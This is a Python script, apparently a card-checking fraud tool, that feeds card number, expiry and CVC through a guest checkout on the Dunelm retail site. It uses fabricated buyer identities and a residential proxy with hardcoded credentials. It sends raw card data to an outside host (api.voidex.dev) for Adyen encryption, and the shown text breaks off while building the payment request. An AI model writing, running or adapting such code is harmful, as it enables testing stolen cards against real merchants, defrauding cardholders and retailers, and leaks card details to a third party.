import requests, re, base64, random, string, user_agent, time
from faker import Faker
from colorama import Fore, Back, Style, init
import random , time , os
from bs4 import BeautifulSoup
import requests
import json
import base64
import hashlib
import random
import socket
import re
import uuid
from datetime import datetime
from bs4 import BeautifulSoup
import user_agent
from faker import Faker

def Tele(ccx):
    ccx = ccx.strip().split('\n')[0]
    nn = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]

    if "20" in yy:
        yy = yy.split("20")[1]
    try:
        faker = Faker()
        ua = user_agent.generate_user_agent()
        acc = faker.user_name() + "@gmail.com" 
        first_name = faker.first_name()  
        last_name = faker.last_name()  
        phone = faker.phone_number()
        username = "pcZ9DikmY6-res-any"
        password = "PC_7q0GZZMMdvBLD388B"
        proxy = "proxy.rapidseedbox.com:5959"
        proxies = {
                        "http": f"http://{username}:{password}@{proxy}",
                        "https": f"http://{username}:{password}@{proxy}"
                    }
        r = requests.Session()
        r.proxies.update(proxies)
        ip_response = r.get("http://httpbin.org/ip", timeout=10)
        ip_data = ip_response.json().get("origin", "غير معروف")
        if nn.startswith('4'):
            card_type = 'visa'
        elif nn.startswith('5'):
            card_type = 'mc'
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'priority': 'u=0, i',
            'referer': 'https://www.dunelm.com/category/offers/all-offers',
            'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': ua,
        }

        params = {
            'defaultSkuId': '30906900',
        }

        response = r.get(
            'https://www.dunelm.com/product/simply-brushed-cotton-standard-pillowcase-pair-1000246081',
            params=params,
            headers=headers,
        )
        time.sleep(10)

        headers = {
            'accept': '*/*',
            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/json',
            'origin': 'https://www.dunelm.com',
            'priority': 'u=1, i',
            'referer': 'https://www.dunelm.com/',
            'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': ua,
        }

        json_data = {
            'query': '\n  mutation AddProduct($basketId: ID!, $sku: String!, $quantity: Int!) {\n    addProduct(basketId: $basketId, sku: $sku, quantity: $quantity) {\n      basket {\n        ...basketAttributes\n      }\n      notifications {\n        ...notificationAttributes\n      }\n    }\n  }\n  \n  fragment basketAttributes on Basket {\n    id\n    orderId\n    expiresAt\n    prices {\n      subtotal\n      total\n      voucherDiscount\n      deliveryDiscount\n    }\n    products {\n      ...productAttributes\n    }\n    vouchers {\n      code\n      title\n    }\n  }\n  \n  fragment productAttributes on BasketProduct {\n    basketQuantity\n    clickAndCollectEligible\n    imageUrl\n    itemId\n    itemName\n    partCode\n    productName\n    productId\n    productName\n    productUrl\n    sellPriceTaxed\n    subtotal\n    sampleType\n    sampleGroup\n    maxSamplesPerOrderAndGroup\n    ageRestricted\n  }\n\n\n  \n  fragment notificationAttributes on BasketNotification {\n    type\n    sku\n    reason\n    additionalData {\n      stockQuantity\n    }\n  }\n\n',
            'variables': {
                'basketId': '63d6f7b9-6329-48a3-8570-1237dd730ce9',
                'sku': '30906900',
                'quantity': 1,
                'addedSku': {
                    'id': '30906900',
                    'inStock': True,
                    'isDiscontinued': False,
                    'media': {
                        'image': [
                            '30906900.jpg',
                            '30906900_alt01.jpg',
                            '30906900_alt02.jpg',
                            '30906900_alt04.jpg',
                            '30906900_alt05.jpg',
                        ],
                        'youtubeId': '',
                    },
                    'price': {
                        'now': 2,
                        'was': 4,
                        'history': [
                            {
                                'value': 4,
                                'date': 'February 2024',
                            },
                            {
                                'value': 3.2,
                                'date': 'December 2024',
                            },
                            {
                                'value': 2.8,
                                'date': 'December 2024',
                            },
                        ],
                    },
                    'rating': {
                        'averageRating': 4.6,
                        'totalCount': 44,
                    },
                    'sampleSkus': [],
                    'crossSellAssociations': [],
                    'crossSellSortOrder': '',
                    'colourGroup': 'Yellow',
                    'definingAttributes': {
                        'colour': 'Yellow-Ochre',
                    },
                    'isReturnable': True,
                    'name': 'Simply Brushed Std Pcase Pr Ochre',
                    'isConsciousChoice': False,
                },
            },
            'operationName': 'AddProduct',
        }

        response = r.post('https://was.dunelm.com/graphql', headers=headers, json=json_data)
        try:
            basket_id = re.search(r'"id":"([a-f0-9-]+)"', response.text).group(1)
            product_id = re.search(r'"productId":"(\d+)"', response.text).group(1)
        except:
            pass
        headers = {
            'accept': '*/*',
            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/json',
            'origin': 'https://www.dunelm.com',
            'priority': 'u=1, i',
            'referer': 'https://www.dunelm.com/',
            'sas-use-cache': '1',
            'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': ua,
        }

        json_data = {
            'operationName': 'CheckoutView',
            'variables': {},
            'query': 'query CheckoutView {\n  viewer {\n    __typename\n    checkoutProvisionalOrder {\n      __typename\n      ...ProvisionalOrder\n      customer {\n        __typename\n        emailAddress\n        addresses {\n          __typename\n          home {\n            ...Address\n            __typename\n          }\n          billing {\n            ...Address\n            __typename\n          }\n          pudoLocation {\n            ...Address\n            __typename\n          }\n        }\n      }\n    }\n  }\n}\n\nfragment CheckoutOrderline on CheckoutOrderline {\n  skuCode\n  quantity\n  unitPrice\n  totalPrice\n  onOrBy\n  delivered\n  elapsed\n  customerPromiseDate\n  carrier\n  labels\n  quote {\n    __typename\n    quoteId\n  }\n  store {\n    __typename\n    sapSiteId\n    name\n    uri\n    streetAddress\n    localArea\n    city\n    county\n    postcode\n    country\n    phone\n    staticMapUrl\n    ccCheckInType\n    location {\n      __typename\n      lat\n      lon\n    }\n    tillTimes\n    openingHours {\n      __typename\n      day\n      open\n      close\n    }\n    facilities {\n      __typename\n      facilityIcon\n      facility\n    }\n    seoText {\n      __typename\n      facility\n      facilityIcon\n      type\n      text\n      spans {\n        __typename\n        start\n        end\n        type\n      }\n    }\n  }\n  skuDetails {\n    __typename\n    name\n    imageUrl\n    skuDefiningValues\n    productName\n  }\n  customProduct\n  customProperties {\n    madeToMeasure {\n      widthInCentimeters\n      lengthInCentimeters\n      totalMeterage\n      midRailInCentimeters\n      display {\n        width\n        length\n        unitOfMeasure\n        midRailUnitOfMeasure\n        options {\n          recess\n          controlSide\n          chainColour\n          rollDirection\n          bracketType\n          controlType\n          stackSide\n          bottomWeightType\n          eyeletColour\n          dressSide\n          singlePair\n          frame\n          frameSides\n          hardwareColour\n          louvreSize\n          numberOfPanels\n          panelConfiguration\n          midRail\n          midRailPosition\n          __typename\n        }\n        __typename\n      }\n      options {\n        recess\n        controlSide\n        chainColour\n        rollDirection\n        bracketType\n        controlType\n        stackSide\n        bottomWeightType\n        eyeletColour\n        dressSide\n        singlePair\n        frame\n        frameSides\n        hardwareColour\n        louvreSize\n        numberOfPanels\n        panelConfiguration\n        midRail\n        midRailPosition\n        __typename\n      }\n      __typename\n    }\n    fitting {\n      isSelected\n      durationInHours\n      numberOfWindows\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment Address on Address {\n  id\n  addressCode\n  lastName\n  city\n  addressType\n  county\n  postcode\n  title\n  firstName\n  phoneNumber\n  countryCode\n  line1\n  line2\n  line3\n  __typename\n}\n\nfragment ProvisionalOrder on CheckoutProvisionalOrder {\n  provisionalOrderId\n  preferredDeliveryMethod\n  expiryDate\n  cc {\n    __typename\n    itemCount\n    lines {\n      ...CheckoutOrderline\n      __typename\n    }\n    collections {\n      __typename\n      lines {\n        ...CheckoutOrderline\n        __typename\n      }\n    }\n  }\n  hd {\n    __typename\n    itemCount\n    lines {\n      ...CheckoutOrderline\n      __typename\n    }\n    deliveries {\n      type\n      onOrBy\n      date\n      fulfilmentType\n      deliveryCharge\n      isDeliveryCallRequired\n      groupId\n      otherOptions {\n        type\n        date\n        deliveryCharge\n        __typename\n      }\n      lines {\n        ...CheckoutOrderline\n        __typename\n      }\n      __typename\n    }\n    deliveryCharges {\n      type\n      charge\n      __typename\n    }\n  }\n  flags {\n    paymentRequired\n    isDeliveryFree\n    checkoutComplete\n    __typename\n  }\n  voucher {\n    __typename\n    basketDiscount\n    discountedDeliveryCharges {\n      discountedAmount\n      originalCharge\n      type\n      __typename\n    }\n    code\n    description\n  }\n  prices {\n    __typename\n    delivery\n    subtotal\n    orderLinesPayable\n    total\n  }\n  promises {\n    sku\n    available\n    promises {\n      ... on Delivery {\n        __typename\n      }\n      ... on HomeDelivery {\n        onOrBy\n        date\n        price\n        available\n        __typename\n      }\n      ... on Standard {\n        onOrBy\n        date\n        price\n        available\n        __typename\n      }\n      ... on NominatedDay {\n        onOrBy\n        date\n        price\n        available\n        __typename\n      }\n      ... on Express {\n        onOrBy\n        date\n        price\n        available\n        __typename\n      }\n      ... on ClickAndCollect {\n        available\n        stores {\n          sapSiteId\n          availability {\n            sku\n            quantity\n            stock\n            __typename\n          }\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n',
        }

        response = r.post('https://was.dunelm.com/graphql', headers=headers, json=json_data)



        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
            'priority': 'u=0, i',
            'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-site',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': ua,
        }

        response = r.get('https://www.dunelm.com/checkout?chkgst:true', headers=headers)
        headers = {
            'accept': '*/*',
            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
            'authorization': 'null',
            'content-type': 'application/json',
            'origin': 'https://www.dunelm.com',
            'priority': 'u=1, i',
            'referer': 'https://www.dunelm.com/',
            'sas-use-cache': '1',
            'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': ua,
        }

        json_data = {
            'operationName': 'GetBasket',
            'variables': {
                'basketId': basket_id,
            },
            'query': 'query GetBasket($basketId: ID!) {\n  getBasket(basketId: $basketId) {\n    basket {\n      ...basketAttributes\n      __typename\n    }\n    notifications {\n      ...notificationAttributes\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment basketAttributes on Basket {\n  id\n  orderId\n  expiresAt\n  prices {\n    subtotal\n    total\n    voucherDiscount\n    deliveryDiscount\n    __typename\n  }\n  products {\n    ...productAttributes\n    __typename\n  }\n  vouchers {\n    code\n    title\n    __typename\n  }\n  __typename\n}\n\nfragment productAttributes on BasketProduct {\n  id\n  basketQuantity\n  clickAndCollectEligible\n  imageUrl\n  itemId\n  itemName\n  partCode\n  productName\n  productId\n  productName\n  productUrl\n  sellPriceTaxed\n  subtotal\n  sampleType\n  sampleGroup\n  maxSamplesPerOrderAndGroup\n  ageRestricted\n  quoteIds\n  customProduct\n  customProperties {\n    madeToMeasure {\n      totalMeterage\n      widthInCentimeters\n      lengthInCentimeters\n      midRailInCentimeters\n      display {\n        width\n        length\n        unitOfMeasure\n        midRailUnitOfMeasure\n        options {\n          recess\n          controlSide\n          rollDirection\n          chainColour\n          bracketType\n          controlType\n          stackSide\n          bottomWeightType\n          eyeletColour\n          singlePair\n          dressSide\n          installationHeight\n          frame\n          frameSides\n          hardwareColour\n          louvreSize\n          numberOfPanels\n          panelConfiguration\n          midRail\n          midRailPosition\n          __typename\n        }\n        __typename\n      }\n      options {\n        recess\n        controlSide\n        rollDirection\n        chainColour\n        bracketType\n        controlType\n        stackSide\n        bottomWeightType\n        eyeletColour\n        singlePair\n        dressSide\n        installationHeight\n        frame\n        frameSides\n        hardwareColour\n        louvreSize\n        numberOfPanels\n        panelConfiguration\n        midRail\n        midRailPosition\n        __typename\n      }\n      __typename\n    }\n    fitting {\n      isSelected\n      durationInHours\n      numberOfWindows\n      __typename\n    }\n    __typename\n  }\n  services {\n    id\n    type\n    __typename\n  }\n  service {\n    type\n    __typename\n  }\n  product {\n    id\n    __typename\n  }\n  __typename\n}\n\nfragment notificationAttributes on BasketNotification {\n  type\n  sku\n  reason\n  additionalData {\n    stockQuantity\n    stockOldQuantity\n    __typename\n  }\n  customProperties {\n    madeToMeasure {\n      totalMeterage\n      widthInCentimeters\n      lengthInCentimeters\n      midRailInCentimeters\n      display {\n        width\n        length\n        unitOfMeasure\n        midRailUnitOfMeasure\n        options {\n          recess\n          controlSide\n          rollDirection\n          chainColour\n          bracketType\n          controlType\n          stackSide\n          bottomWeightType\n          eyeletColour\n          installationHeight\n          frame\n          frameSides\n          hardwareColour\n          louvreSize\n          numberOfPanels\n          panelConfiguration\n          midRail\n          midRailPosition\n          __typename\n        }\n        __typename\n      }\n      options {\n        recess\n        controlSide\n        rollDirection\n        chainColour\n        bracketType\n        controlType\n        stackSide\n        bottomWeightType\n        eyeletColour\n        installationHeight\n        frame\n        frameSides\n        hardwareColour\n        louvreSize\n        numberOfPanels\n        panelConfiguration\n        midRail\n        midRailPosition\n        __typename\n      }\n      __typename\n    }\n    fitting {\n      isSelected\n      durationInHours\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n',
        }

        response = r.post('https://was.dunelm.com/graphql', headers=headers, json=json_data)
        headers = {
            'accept': '*/*',
            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/json',
            'origin': 'https://www.dunelm.com',
            'priority': 'u=1, i',
            'referer': 'https://www.dunelm.com/',
            'sas-use-cache': '1',
            'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': ua,
        }

        json_data = {
            'operationName': 'CheckoutBasket',
            'variables': {
                'basketId': basket_id,
                'preferredDeliveryMethod': 'homeDelivery',
                'orderSource': 'WEB',
            },
            'query': 'mutation CheckoutBasket($basketId: ID, $preferredDeliveryMethod: PreferredDeliveryMethod!, $clickAndCollectLocationCode: String, $orderSource: String, $hdOnlySkus: [String], $ccOnlySkus: [String]) {\n  checkoutBasket(input: {basketId: $basketId, preferredDeliveryMethod: $preferredDeliveryMethod, clickAndCollectLocationCode: $clickAndCollectLocationCode, orderSource: $orderSource, hdOnlySkus: $hdOnlySkus, ccOnlySkus: $ccOnlySkus}) {\n    provisionalOrderId\n    __typename\n  }\n}\n',
        }

        response = r.post('https://was.dunelm.com/graphql', headers=headers, json=json_data)
        headers = {
            'accept': '*/*',
            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/json',
            'origin': 'https://www.dunelm.com',
            'priority': 'u=1, i',
            'referer': 'https://www.dunelm.com/',
            'sas-use-cache': '1',
            'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': ua,
        }

        json_data = {
            'operationName': 'UpdateProvisionalOrder',
            'variables': {
                'updateProvisionalOrderDetailsInput': {
                    'emailAddress': acc,
                    'deliveryAddress': {
                        'id': basket_id,
                        'lastName': first_name,
                        'firstName': last_name,
                        'title': 'mrs',
                        'phoneNumber': '0433656463',
                        'city': 'Melton Mowbray',
                        'postcode': 'LE13 9EE',
                        'countryCode': 'GB',
                        'line1': 'Po Box 10080',
                        'line2': None,
                        'line3': None,
                    },
                    'billingAddress': {
                        'id': basket_id,
                        'line1': 'Po Box 10080',
                        'line2': None,
                        'line3': None,
                        'city': 'Melton Mowbray',
                        'countryCode': 'GB',
                        'firstName': 'Christa',
                        'lastName': 'afadf',
                        'title': 'mrs',
                        'phoneNumber': '0433656463',
                        'postcode': 'LE13 9EE',
                    },
                    'deliveryOptions': {
                        'selectedNominatedDates': None,
                        'selectedStandardUpgradeableOption': 'standard',
                    },
                    'marketingPreferences': {
                        'email': True,
                    },
                    'isGuestCheckout': True,
                },
            },
            'query': 'mutation UpdateProvisionalOrder($updateProvisionalOrderDetailsInput: UpdateProvisionalOrderDetailsInput!) {\n  updateProvisionalOrderDetails(input: $updateProvisionalOrderDetailsInput) {\n    provisionalOrderId\n    __typename\n  }\n}\n',
        }

        response = r.post('https://was.dunelm.com/graphql', headers=headers, json=json_data)
        try:
            provisional_order_id = re.search(r'"provisionalOrderId":"([\w-]+)"', response.text).group(1)
        except:
            pass
        headers = {
            'accept': '*/*',
            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/json',
            'origin': 'https://www.dunelm.com',
            'priority': 'u=1, i',
            'referer': 'https://www.dunelm.com/',
            'sas-use-cache': '1',
            'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': ua,
        }

        json_data = {
            'operationName': 'CheckoutView',
            'variables': {},
            'query': 'query CheckoutView {\n  viewer {\n    __typename\n    checkoutProvisionalOrder {\n      __typename\n      ...ProvisionalOrder\n      customer {\n        __typename\n        emailAddress\n        addresses {\n          __typename\n          home {\n            ...Address\n            __typename\n          }\n          billing {\n            ...Address\n            __typename\n          }\n          pudoLocation {\n            ...Address\n            __typename\n          }\n        }\n      }\n    }\n  }\n}\n\nfragment CheckoutOrderline on CheckoutOrderline {\n  skuCode\n  quantity\n  unitPrice\n  totalPrice\n  onOrBy\n  delivered\n  elapsed\n  customerPromiseDate\n  carrier\n  labels\n  quote {\n    __typename\n    quoteId\n  }\n  store {\n    __typename\n    sapSiteId\n    name\n    uri\n    streetAddress\n    localArea\n    city\n    county\n    postcode\n    country\n    phone\n    staticMapUrl\n    ccCheckInType\n    location {\n      __typename\n      lat\n      lon\n    }\n    tillTimes\n    openingHours {\n      __typename\n      day\n      open\n      close\n    }\n    facilities {\n      __typename\n      facilityIcon\n      facility\n    }\n    seoText {\n      __typename\n      facility\n      facilityIcon\n      type\n      text\n      spans {\n        __typename\n        start\n        end\n        type\n      }\n    }\n  }\n  skuDetails {\n    __typename\n    name\n    imageUrl\n    skuDefiningValues\n    productName\n  }\n  customProduct\n  customProperties {\n    madeToMeasure {\n      widthInCentimeters\n      lengthInCentimeters\n      totalMeterage\n      midRailInCentimeters\n      display {\n        width\n        length\n        unitOfMeasure\n        midRailUnitOfMeasure\n        options {\n          recess\n          controlSide\n          chainColour\n          rollDirection\n          bracketType\n          controlType\n          stackSide\n          bottomWeightType\n          eyeletColour\n          dressSide\n          singlePair\n          frame\n          frameSides\n          hardwareColour\n          louvreSize\n          numberOfPanels\n          panelConfiguration\n          midRail\n          midRailPosition\n          __typename\n        }\n        __typename\n      }\n      options {\n        recess\n        controlSide\n        chainColour\n        rollDirection\n        bracketType\n        controlType\n        stackSide\n        bottomWeightType\n        eyeletColour\n        dressSide\n        singlePair\n        frame\n        frameSides\n        hardwareColour\n        louvreSize\n        numberOfPanels\n        panelConfiguration\n        midRail\n        midRailPosition\n        __typename\n      }\n      __typename\n    }\n    fitting {\n      isSelected\n      durationInHours\n      numberOfWindows\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment Address on Address {\n  id\n  addressCode\n  lastName\n  city\n  addressType\n  county\n  postcode\n  title\n  firstName\n  phoneNumber\n  countryCode\n  line1\n  line2\n  line3\n  __typename\n}\n\nfragment ProvisionalOrder on CheckoutProvisionalOrder {\n  provisionalOrderId\n  preferredDeliveryMethod\n  expiryDate\n  cc {\n    __typename\n    itemCount\n    lines {\n      ...CheckoutOrderline\n      __typename\n    }\n    collections {\n      __typename\n      lines {\n        ...CheckoutOrderline\n        __typename\n      }\n    }\n  }\n  hd {\n    __typename\n    itemCount\n    lines {\n      ...CheckoutOrderline\n      __typename\n    }\n    deliveries {\n      type\n      onOrBy\n      date\n      fulfilmentType\n      deliveryCharge\n      isDeliveryCallRequired\n      groupId\n      otherOptions {\n        type\n        date\n        deliveryCharge\n        __typename\n      }\n      lines {\n        ...CheckoutOrderline\n        __typename\n      }\n      __typename\n    }\n    deliveryCharges {\n      type\n      charge\n      __typename\n    }\n  }\n  flags {\n    paymentRequired\n    isDeliveryFree\n    checkoutComplete\n    __typename\n  }\n  voucher {\n    __typename\n    basketDiscount\n    discountedDeliveryCharges {\n      discountedAmount\n      originalCharge\n      type\n      __typename\n    }\n    code\n    description\n  }\n  prices {\n    __typename\n    delivery\n    subtotal\n    orderLinesPayable\n    total\n  }\n  promises {\n    sku\n    available\n    promises {\n      ... on Delivery {\n        __typename\n      }\n      ... on HomeDelivery {\n        onOrBy\n        date\n        price\n        available\n        __typename\n      }\n      ... on Standard {\n        onOrBy\n        date\n        price\n        available\n        __typename\n      }\n      ... on NominatedDay {\n        onOrBy\n        date\n        price\n        available\n        __typename\n      }\n      ... on Express {\n        onOrBy\n        date\n        price\n        available\n        __typename\n      }\n      ... on ClickAndCollect {\n        available\n        stores {\n          sapSiteId\n          availability {\n            sku\n            quantity\n            stock\n            __typename\n          }\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n',
        }

        response = r.post('https://was.dunelm.com/graphql', headers=headers, json=json_data)
        headers = {
            'accept': '*/*',
            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/json',
            'origin': 'https://www.dunelm.com',
            'priority': 'u=1, i',
            'referer': 'https://www.dunelm.com/',
            'sas-use-cache': '1',
            'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': ua,
        }

        json_data = {
            'operationName': 'PaymentViewer',
            'variables': {
                'isMposAdyen': False,
                'isLtcBroaderBasket': True,
            },
            'query': 'query PaymentViewer($isStepUpRequired: Boolean, $isMposAdyen: Boolean, $isLtcBroaderBasket: Boolean) {\n  viewer {\n    __typename\n    paymentTypes(isStepUpRequired: $isStepUpRequired, isMposAdyen: $isMposAdyen, isLtcBroaderBasket: $isLtcBroaderBasket) {\n      payments {\n        name\n        url\n        payload\n        provider\n        customerOrderId\n        __typename\n      }\n      __typename\n    }\n    checkoutProvisionalOrder {\n      __typename\n      voucher {\n        __typename\n        isValid\n        basketDiscount\n        code\n        description\n        discountedDeliveryCharges {\n          discountedAmount\n          originalCharge\n          type\n          __typename\n        }\n      }\n      stockCheck {\n        __typename\n        result\n      }\n    }\n  }\n}\n',
        }

        response = r.post('https://was.dunelm.com/graphql', headers=headers, json=json_data)
        headers = {
            'accept': '*/*',
            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/json',
            'origin': 'https://www.dunelm.com',
            'priority': 'u=1, i',
            'referer': 'https://www.dunelm.com/',
            'sas-use-cache': '1',
            'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': ua,
        }

        json_data = {
            'operationName': 'customerDetailsByEmailQuery',
            'variables': {
                'email': acc,
            },
            'query': 'query customerDetailsByEmailQuery($email: String!) {\n  customerDetailsByEmail(email: $email) {\n    knownCustomer\n    __typename\n  }\n}\n',
        }

        response = r.post('https://was.dunelm.com/graphql', headers=headers, json=json_data)

        headers = {
            'accept': '*/*',
            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/json',
            'origin': 'https://www.dunelm.com',
            'priority': 'u=1, i',
            'referer': 'https://www.dunelm.com/',
            'sas-use-cache': '1',
            'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': ua,
        }

        json_data = {
            'operationName': 'AdyenOrder',
            'variables': {},
            'query': 'mutation AdyenOrder {\n  adyenOrder {\n    amount {\n      currency\n      value\n      __typename\n    }\n    remainingAmount {\n      currency\n      value\n      __typename\n    }\n    orderData\n    pspReference\n    reference\n    expiresAt\n    resultCode\n    adyenResponse {\n      amount {\n        currency\n        value\n        __typename\n      }\n      remainingAmount {\n        currency\n        value\n        __typename\n      }\n      orderData\n      pspReference\n      reference\n      expiresAt\n      resultCode\n      __typename\n    }\n    __typename\n  }\n}\n',
        }

        response = r.post('https://was.dunelm.com/graphql', headers=headers, json=json_data)
        try:
            psp_reference = re.search(r'"pspReference":"([\w-]+)"', response.text).group(1)
            order_data = re.search(r'"orderData":"([^"]+)"', response.text).group(1)
        except:
            pass
        pubkey = "10001|A9AB882C9833E67E0D8F45715BF0DAFF4D840FF33B08689F24368E4006F8ECD434A992CB9EAB9B9D6CDA98482214F1F4F83018244FD42D94C5F2D36B0DD4C18470D8E69F40C3E6A24FF8422D9DFA439F16585A95613A97CF0F6AFE7BAA6023C29215B9394A040F88D1A795B65D24210A93AC10B5C92AF2619DBCEC742CED708C72AC360702FBE9D832F4054D4C910B9E0B672249387EA295D59DAD670D7D8C8E69EC3755453AC550E1FDA26864D73CB21696389B7E7CFED29C8809AC708B018D5F783C1FE8FC34D898056ECAFE7AB1E540C4FF62A2B77810C2224B8F4E2F93E5355869861E5797D4BF4BEC72DF65AB8DA46F95DA5FFD75997DDFB4FBA5DFE777"
        card = f"{nn}|{mm}|20{yy}|{cvc}"
            
        def adyen_enc(card:str, pubkey:str):
            try:
                url=  "https://api.voidex.dev/api/ayden"
                params = {"card": card, "pubkey": pubkey}
                resp = requests.get(url, params=params)
                return resp.json()
            except Exception as e:
                return {"error": str(e)}
            
            
        p = (adyen_enc(card, pubkey))
            #print(p)
        cv = (p['data']['encryptedSecurityCode'])
            
            
            
        m = (p['data']['encryptedExpiryMonth'])
            
        y = (p['data']['encryptedExpiryYear'])
            
            
        n = (p['data']['encryptedCardNumber'])
            
        headers = {
            'accept': '*/*',
            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/json',
            'origin': 'https://www.dunelm.com',
            'priority': 'u=1, i',
            'referer': 'https://www.dunelm.com/',
            'sas-use-cache': '1',
            'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': ua,
        }

        json_data = {
            'operationName': 'AdyenPayment',
            'variables': {
                'input': {
                    'paymentMethod': {
                        'type': 'scheme',
                        'holderName': f'{first_name} {last_name}',
                        #'encryptedSecurityCode': cv,
                        'encryptedCardNumber': n,
                        'encryptedExpiryMonth': m,
                        'encryptedExpiryYear': y,
                        'brand': card_type,
                    },
                    'browserInfo': {
                        'acceptHeader': '*/*',
                        'colorDepth': 24,
                        'language': 'ar',
                        'javaEnabled': False,
                        'screenHeight': 1080,
                        'screenWidth': 1920,
                        'userAgent': ua,
                        'timeZoneOffset': -120,
                    },
                    'idempotencyKey': f'{provisional_order_id}-5.95-scheme',
                    'amount': {
                        'value': 595,
                        'currency': 'GBP',
                    },
                    'order': {
                        'orderData': order_data,
                        'pspReference': psp_reference,
                    },
                    'provisionalOrderId': provisional_order_id,
                },
            },
